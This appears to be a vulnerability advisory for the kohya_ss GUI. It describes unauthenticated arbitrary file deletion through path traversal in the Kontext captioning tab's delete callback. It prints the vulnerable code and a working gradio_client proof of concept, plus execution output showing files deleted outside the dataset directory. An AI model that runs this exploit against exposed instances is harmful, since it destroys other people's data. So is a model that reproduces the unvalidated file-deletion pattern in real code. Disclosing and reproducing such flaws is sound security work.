## Description

The Kontext manual captioning tab's delete callback trusts client-controlled hidden Gradio components as filesystem inputs (`kohya_gui/kontext_manual_caption_gui.py`):

```python
delete_button.click(
    delete_images_and_caption,
    inputs=[image_file, loaded_control_images_dir, loaded_images_dir, caption_ext],
    ...)
```

```python
def delete_images_and_caption(image_file, control_images_dir, target_images_dir, caption_ext):
    control_image_path = os.path.join(control_images_dir, image_file)
    if os.path.exists(control_image_path):
        os.remove(control_image_path)
    target_image_path = os.path.join(target_images_dir, image_file)
    ...os.remove(target_image_path)...
```

All four inputs are browser-submitted values (hidden `gr.Text` components are still part of the event payload and fully attacker-controllable). There is no check that `image_file` belongs to the server-side loaded image set, no `..` rejection, and no containment validation of `loaded_images_dir` — which is passed as an absolute path by the client.

## Impact

When the GUI is exposed beyond localhost (`--listen`, the documented docker deployment, or `--share` tunnels; `--username/--password` default to empty so `auth=None`), any unauthenticated user who can reach the port can delete arbitrary files readable/writable by the GUI process — `os.remove` per call with attacker-chosen directory and filename, including `../` traversal out of the dataset directory. Same-pattern hidden fields are also used by the save/load callbacks in this tab.

## PoC

Verified against the current kohya_ss source: the real Kontext tab is launched headless via `gradio_kontext_manual_caption_gui_tab(headless=True)` with `demo.launch(server_name="127.0.0.1", server_port=7860)`. The "attacker" is an anonymous `gradio_client` over plain HTTP (no credentials):

```python
from gradio_client import Client
client = Client("http://127.0.0.1:7860/", verbose=False)

# Attack A: traversal out of the working dir

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
client.predict(image_file="../outside_dataset_root.txt",
               control_images_dir=BASE, target_images_dir=BASE,
               caption_ext=".caption", api_name="/delete_images_and_caption")

# Attack B: attacker-chosen absolute directory + filename
client.predict(image_file="important_data.txt",
               control_images_dir=VICTIM_DIR, target_images_dir=VICTIM_DIR,
               caption_ext=".caption", api_name="/delete_images_and_caption")
```

## Execution result

```
[attack A] traversal '../outside_dataset_root.txt' -> outside file deleted: True
[attack A] api response: {'visible': True, 'value': '🗑️ Deleted files for `../outside_dataset_root.txt`', '__type__': 'update'}
23:05:39 INFO  Deleted control image: .../poc-02-kontext-delete/victim_dir/important_data.txt
[attack B] arbitrary dir + filename -> dataset file deleted: True
[RESULT] {"poc": "kohya-02-kontext-arbitrary-delete", "verdict": "REPRODUCED",
          "outside_file_deleted_via_traversal": true,
          "victim_file_deleted_via_arbitrary_dir": true}
```

Both files were removed by the unauthenticated remote calls, and the GUI cheerfully echoes the traversal path in its status message.
